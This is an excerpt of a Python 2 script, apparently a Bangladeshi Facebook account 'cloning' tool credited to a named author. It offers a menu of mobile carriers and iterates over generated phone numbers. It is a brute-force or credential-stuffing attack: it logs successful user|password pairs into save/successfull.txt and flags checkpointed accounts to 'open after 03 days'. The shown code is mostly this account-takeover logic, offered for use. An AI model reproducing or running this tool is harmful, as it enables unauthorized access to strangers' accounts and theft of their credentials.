...
os.system('clear')
psb('\x1b[1;32mBANGLADESH SUMON 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
logo = '\n|.d8888. db    db .88b  d88.  .d88b.  d8b   db \n|88'  YP 88    88 88'YbdP`88 .8P  Y8. 888o  88 \n|`8bo.   88    88 88  88  88 88    88 88V8o 88 \n|  `Y8b. 88    88 88  88  88 88    88 88 V8o88 \n|db   8D 88b  d88 88  88  88 `8b  d8' 88  V888\n|`8888Y' ~Y8888P' YP  YP  YP  `Y88P'  VP   V8P'
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : MOHAMMAD SUMON AHMED'
    print 'FACEBOOK : Mohammad Sumon Ahmed'
    print 'GITHUB     : github.com/MohammadSumonAhmed'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGrameenphone'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SUMON-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SUMON-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
